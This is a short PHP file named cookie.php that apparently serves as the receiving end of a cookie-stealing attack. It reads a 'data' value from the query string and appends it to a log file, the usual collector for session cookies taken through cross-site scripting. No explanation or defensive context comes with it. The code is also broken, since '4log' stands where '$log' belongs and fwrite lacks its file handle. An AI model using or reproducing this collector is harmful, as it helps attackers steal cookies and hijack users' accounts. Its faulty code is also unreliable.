cookie.php
<?
$cookie=$_GET["data"];
4log=fopen("data.txt","a");
fwrite($cookie."\r\n");
fclose($log);
?>
